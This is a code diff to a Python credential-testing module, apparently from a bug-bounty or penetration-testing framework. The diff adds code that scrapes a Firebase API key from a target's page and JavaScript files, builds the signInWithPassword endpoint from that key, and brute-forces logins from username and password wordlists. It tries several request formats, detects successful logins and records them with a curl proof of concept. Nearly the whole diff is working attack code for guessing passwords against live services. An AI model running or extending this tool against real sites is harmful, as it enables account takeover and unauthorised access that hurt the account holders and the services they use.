@@ -8,6 +8,7 @@ import urllib.request
 import urllib.error
 import urllib.parse
 import base64
+import re
 
 
 class CredentialTester(BaseModule):
@@ -49,25 +50,114 @@ class CredentialTester(BaseModule):
         target_url = target if target.startswith(('http://', 'https://')) else f"https://{target}"
 
         print(f"\033[96m[*] Target URL: {target_url}\033[0m")
-        print(f"\033[96m[*] Brute forcing regardless of form type...\033[0m")
+
+        # Check if direct Firebase URL provided
+        if 'identitytoolkit.googleapis.com' in target_url:
+            print(f"\033[92m[+] Using Firebase Identity Toolkit URL directly\033[0m")
+            endpoint = {
+                'url': target_url,
+                'form_type': 'firebase',
+                'fields': {
+                    'username_fields': ['email'],
+                    'password_field': 'password'
+                }
+            }
+        else:
+            # Try to extract Firebase config from the page
+            print(f"\033[96m[*] Attempting to extract Firebase config...\033[0m")
+            firebase_url = await self._extract_firebase_endpoint(target_url)
+            
+            if firebase_url:
+                print(f"\033[92m[+] Firebase endpoint found: {firebase_url}\033[0m")
+                endpoint = {
+                    'url': firebase_url,
+                    'form_type': 'firebase',
+                    'fields': {
+                        'username_fields': ['email'],
+                        'password_field': 'password'
+                    }
+                }
+            else:
+                print(f"\033[93m[!] Could not extract Firebase config, trying direct brute force on provided URL\033[0m")
+                # Fallback: try brute forcing the provided URL directly with multiple formats
+                endpoint = {
+                    'url': target_url,
+                    'form_type': 'auto',
+                    'fields': {
+                        'username_fields': ['email', 'username', 'user', 'login'],
+                        'password_field': 'password'
+                    }
+                }
 
         ulist_label = self.custom_userlist or f"{self.wordlist_path}/usernames.txt"
         plist_label = self.custom_passlist or f"{self.wordlist_path}/passwords.txt"
         print(f"\033[96m[*] Userlist : {ulist_label}\033[0m")
         print(f"\033[96m[*] Passlist : {plist_label}\033[0m\n")
 
-        # Create endpoint dict with target URL - no form detection, just brute force
-        endpoint = {
-            'url': target_url,
-            'form_type': 'auto',
-            'fields': {
-                'username_fields': ['email', 'username', 'user', 'login', 'name'],
-                'password_field': 'password'
-            }
-        }
-
         await self._test_brute_force(endpoint)
         return self.findings
+
+    async def _extract_firebase_endpoint(self, url: str) -> Optional[str]:
+        """Extract Firebase API key from page and construct Identity Toolkit endpoint"""
+        try:
+            # Fetch the page
+            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
+            with urllib.request.urlopen(req, timeout=15) as response:
+                html = response.read().decode('utf-8', errors='ignore')
+            
+            # Look for apiKey in various formats
+            api_key = None
+            
+            # Pattern 1: Standard Firebase config
+            patterns = [
+                r'apiKey["\\'\\s]*[:=]["\\'\\s]*([A-Za-z0-9_-]{39})',
+                r'apiKey:\s*["\\']([A-Za-z0-9_-]{39})["\\']',
+                r'"apiKey":\s*"([A-Za-z0-9_-]{39})"',
+                r'apiKey\s*=\s*["\\']([A-Za-z0-9_-]{39})["\\']',
+                r'AIza[0-9A-Za-z_-]{35}',  # Direct API key pattern
+            ]
+            
+            for pattern in patterns:
+                match = re.search(pattern, html)
+                if match:
+                    api_key = match.group(1) if match.groups() else match.group(0)
+                    print(f"\033[92m[+] Found API key in page source\033[0m")
+                    break
+            
+            # If not found in HTML, check linked JS files
+            if not api_key:
+                js_files = re.findall(r'src=["\\']([^"\\']+\.js)["\\']', html)
+                print(f"\033[96m[*] Scanning {len(js_files)} JS files for API key...\033[0m")
+                
+                for js_path in js_files[:10]:  # Limit to first 10 JS files
+                    try:
+                        js_url = js_path if js_path.startswith('http') else urllib.parse.urljoin(url, js_path)
+                        js_req = urllib.request.Request(js_url, headers={'User-Agent': 'Mozilla/5.0'})
+                        with urllib.request.urlopen(js_req, timeout=10) as js_response:
+                            js_content = js_response.read().decode('utf-8', errors='ignore')
+                        
+                        for pattern in patterns:
+                            match = re.search(pattern, js_content)
+                            if match:
+                                api_key = match.group(1) if match.groups() else match.group(0)
+                                print(f"\033[92m[+] Found API key in {js_path}\033[0m")
+                                break
+                        
+                        if api_key:
+                            break
+                    except Exception:
+                        continue
+            
+            if api_key:
+                # Construct Firebase Identity Toolkit endpoint
+                firebase_url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={api_key}"
+                return firebase_url
+            
+            return None
+            
+        except Exception as e:
+            self.logger.debug(f"Failed to extract Firebase config: {e}")
+            return None
 
     def _load_wordlists(self) -> Tuple[List[str], List[str]]:
         usernames: List[str] = []
@@ -143,6 +233,9 @@ class CredentialTester(BaseModule):
         import itertools
 
         url = endpoint['url']
+        form_type = endpoint.get('form_type', 'auto')
+        fields = endpoint.get('fields', {})
+        
         base_usernames, passwords = self._load_wordlists()
         all_usernames = list(dict.fromkeys(base_usernames))
         total_attempts = len(all_usernames) * len(passwords)
@@ -152,6 +245,7 @@ class CredentialTester(BaseModule):
         rate_limited = [False]
         counter = [0]
 
+        print(f"\033[96m[*] Form Type : {form_type}\033[0m")
         print(f"\033[96m[*] Usernames : {len(all_usernames)}\033[0m")
         print(f"\033[96m[*] Passwords : {len(passwords)}\033[0m")
         print(f"\033[96m[*] Total     : {total_attempts}\033[0m\n")
@@ -166,10 +260,8 @@ class CredentialTester(BaseModule):
                     loop = asyncio.get_event_loop()
 
                     def do_request():
-                        # Try multiple payload formats - return on first non-400 response
-                        
-                        # Format 1: JSON (email/password) - Firebase style
-                        try:
+                        # If Firebase endpoint, use Firebase format
+                        if form_type == 'firebase' or 'identitytoolkit' in url:
                             body = json.dumps({
                                 'email': username,
                                 'password': password,
@@ -178,96 +270,100 @@ class CredentialTester(BaseModule):
                             req = urllib.request.Request(
                                 url,
                                 data=body,
-                                headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
-                                method='POST'
-                            )
-                            with urllib.request.urlopen(req, timeout=10) as r:
-                                return r.status, r.read().decode('utf-8', errors='ignore'), dict(r.headers), 'json_email'
-                        except urllib.error.HTTPError as e:
-                            if e.code not in [400, 401, 403, 404]:
-                                return e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers), 'json_email'
-                        except Exception:
-                            pass
-
-                        # Format 2: JSON (username/password)
-                        try:
-                            body = json.dumps({
-                                'username': username,
-                                'password': password
-                            }).encode('utf-8')
-                            req = urllib.request.Request(
-                                url,
-                                data=body,
-                                headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
-                                method='POST'
-                            )
-                            with urllib.request.urlopen(req, timeout=10) as r:
-                                return r.status, r.read().decode('utf-8', errors='ignore'), dict(r.headers), 'json_user'
-                        except urllib.error.HTTPError as e:
-                            if e.code not in [400, 401, 403, 404]:
-                                return e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers), 'json_user'
-                        except Exception:
-                            pass
-
-                        # Format 3: Form URL encoded (email/password)
-                        try:
-                            data = urllib.parse.urlencode({
-                                'email': username,
-                                'password': password
-                            }).encode('utf-8')
-                            req = urllib.request.Request(
-                                url,
-                                data=data,
-                                headers={'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'},
-                                method='POST'
-                            )
-                            with urllib.request.urlopen(req, timeout=10) as r:
-                                return r.status, r.read().decode('utf-8', errors='ignore'), dict(r.headers), 'form_email'
-                        except urllib.error.HTTPError as e:
-                            if e.code not in [400, 401, 403, 404]:
-                                return e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers), 'form_email'
-                        except Exception:
-                            pass
-
-                        # Format 4: Form URL encoded (username/password)
-                        try:
-                            data = urllib.parse.urlencode({
-                                'username': username,
-                                'password': password
-                            }).encode('utf-8')
-                            req = urllib.request.Request(
-                                url,
-                                data=data,
-                                headers={'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'},
-                                method='POST'
-                            )
-                            with urllib.request.urlopen(req, timeout=10) as r:
-                                return r.status, r.read().decode('utf-8', errors='ignore'), dict(r.headers), 'form_user'
-                        except urllib.error.HTTPError as e:
-                            if e.code not in [400, 401, 403, 404]:
-                                return e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers), 'form_user'
-                        except Exception:
-                            pass
-
-                        # Format 5: Basic Auth
-                        try:
-                            auth_str = base64.b64encode(f"{username}:{password}".encode()).decode()
-                            req = urllib.request.Request(
-                                url,
                                 headers={
-                                    'Authorization': f'Basic {auth_str}',
+                                    'Content-Type': 'application/json',
                                     'User-Agent': 'Mozilla/5.0'
                                 },
-                                method='GET'
+                                method='POST'
                             )
-                            with urllib.request.urlopen(req, timeout=10) as r:
-                                return r.status, r.read().decode('utf-8', errors='ignore'), dict(r.headers), 'basic_auth'
-                        except urllib.error.HTTPError as e:
-                            return e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers), 'basic_auth'
-                        except Exception as e:
-                            return 0, str(e), {}, 'unknown'
+                            try:
+                                with urllib.request.urlopen(req, timeout=15) as r:
+                                    return r.status, r.read().decode('utf-8', errors='ignore'), dict(r.headers), 'firebase'
+                            except urllib.error.HTTPError as e:
+                                return e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers), 'firebase'
+                            except Exception as e:
+                                return 0, str(e), {}, 'firebase'
+                        
+                        # Otherwise try multiple formats
+                        else:
+                            # Try JSON email format
+                            try:
+                                body = json.dumps({
+                                    'email': username,
+                                    'password': password
+                                }).encode('utf-8')
+                                req = urllib.request.Request(
+                                    url,
+                                    data=body,
+                                    headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
+                                    method='POST'
+                                )
+                                with urllib.request.urlopen(req, timeout=10) as r:
+                                    return r.status, r.read().decode('utf-8', errors='ignore'), dict(r.headers), 'json_email'
+                            except urllib.error.HTTPError as e:
+                                if e.code not in [400, 401, 403]:
+                                    return e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers), 'json_email'
+                            except Exception:
+                                pass
 
-                        return 0, 'All formats failed', {}, 'unknown'
+                            # Try JSON username format
+                            try:
+                                body = json.dumps({
+                                    'username': username,
+                                    'password': password
+                                }).encode('utf-8')
+                                req = urllib.request.Request(
+                                    url,
+                                    data=body,
+                                    headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
+                                    method='POST'
+                                )
+                                with urllib.request.urlopen(req, timeout=10) as r:
+                                    return r.status, r.read().decode('utf-8', errors='ignore'), dict(r.headers), 'json_user'
+                            except urllib.error.HTTPError as e:
+                                if e.code not in [400, 401, 403]:
+                                    return e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers), 'json_user'
+                            except Exception:
+                                pass
+
+                            # Try form email format
+                            try:
+                                data = urllib.parse.urlencode({
+                                    'email': username,
+                                    'password': password
+                                }).encode('utf-8')
+                                req = urllib.request.Request(
+                                    url,
+                                    data=data,
+                                    headers={'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'},
+                                    method='POST'
+                                )
+                                with urllib.request.urlopen(req, timeout=10) as r:
+                                    return r.status, r.read().decode('utf-8', errors='ignore'), dict(r.headers), 'form_email'
+                            except urllib.error.HTTPError as e:
+                                if e.code not in [400, 401, 403]:
+                                    return e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers), 'form_email'
+                            except Exception:
+                                pass
+
+                            # Try form username format
+                            try:
+                                data = urllib.parse.urlencode({
+                                    'username': username,
+                                    'password': password
+                                }).encode('utf-8')
+                                req = urllib.request.Request(
+                                    url,
+                                    data=data,
+                                    headers={'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'},
+                                    method='POST'
+                                )
+                                with urllib.request.urlopen(req, timeout=10) as r:
+                                    return r.status, r.read().decode('utf-8', errors='ignore'), dict(r.headers), 'form_user'
+                            except urllib.error.HTTPError as e:
+                                return e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers), 'form_user'
+                            except Exception as e:
+                                return 0, str(e), {}, 'unknown'
 
                     status, text, resp_headers, used_format = await loop.run_in_executor(None, do_request)
                     tl = text.lower()
@@ -289,31 +385,25 @@ class CredentialTester(BaseModule):
                     # Success detection
                     is_success = False
 
-                    # Check for auth tokens in response
-                    if any(k in tl for k in ['idtoken', 'id_token', 'access_token', 'auth_token', 'token', 'sessionid', 'session_id', 'jwt', 'refresh_token']):
-                        if not any(err in tl for err in ['invalid', 'error', 'failed', 'wrong', 'incorrect', 'denied', 'unauthorized', 'null']):
+                    # Firebase success: returns idToken
+                    if used_format == 'firebase':
+                        if 'idtoken' in tl or 'id_token' in tl:
+                            if not any(err in tl for err in ['invalid', 'error', 'failed']):
+                                is_success = True
+                        # Also check for registered field which indicates valid credentials
+                        elif 'registered' in tl and 'true' in tl:
                             is_success = True
-
-                    # Check for successful HTTP status with positive indicators
-                    if status in [200, 201, 202]:
-                        error_indicators = ['invalid', 'incorrect', 'failed', 'error', 'wrong', 'denied', 'unauthorized', 'try again', 'not found', 'false']
-                        if not any(err in tl for err in error_indicators):
-                            success_indicators = ['welcome', 'dashboard', 'success', 'logged in', 'authenticated', 'profile', 'home', 'admin', 'redirect', 'token', 'idtoken']
-                            if any(succ in tl for succ in success_indicators):
-                                is_success = True
-                            cookies = str(resp_headers.get('Set-Cookie', '')).lower()
-                            if any(c in cookies for c in ['session', 'token', 'auth', 'jwt', 'sid', 'uid']):
-                                is_success = True
-
-                    # Redirect to non-login page indicates success
-                    if status in [301, 302, 303, 307, 308]:
+                    
+                    # Generic success detection
+                    elif any(k in tl for k in ['token', 'access_token', 'session', 'success']):
+                        if not any(err in tl for err in ['invalid', 'error', 'failed', 'wrong', 'denied']):
+                            is_success = True
+                    
+                    # Check for redirects
+                    if status in [301, 302, 303]:
                         location = resp_headers.get('Location', '').lower()
-                        if location and not any(p in location for p in ['login', 'signin', 'error', 'fail', 'denied', 'auth']):
+                        if location and not any(p in location for p in ['login', 'error', 'fail']):
                             is_success = True
-
-                    # 200 OK on Basic Auth is success
-                    if used_format == 'basic_auth' and status == 200:
-                        is_success = True
 
                     if is_success:
                         sys.stdout.write('\n')
@@ -357,7 +447,7 @@ class CredentialTester(BaseModule):
             severity='Critical',
             description=f'Successfully brute-forced login at {url}\nUsername: {username}\nPassword: {password}\nAttempts: {attempts}',
             evidence={'username': username, 'password': password, 'url': url, 'attempts': attempts},
-            poc=f"curl -X POST '{url}' -d 'username={username}&password={password}'",
+            poc=f"curl -X POST '{url}' -d 'email={username}&password={password}'",
             remediation='Implement strong password policy, rate limiting, and account lockout',
             cvss_score=9.8, bounty_score=5000, target=url))
 
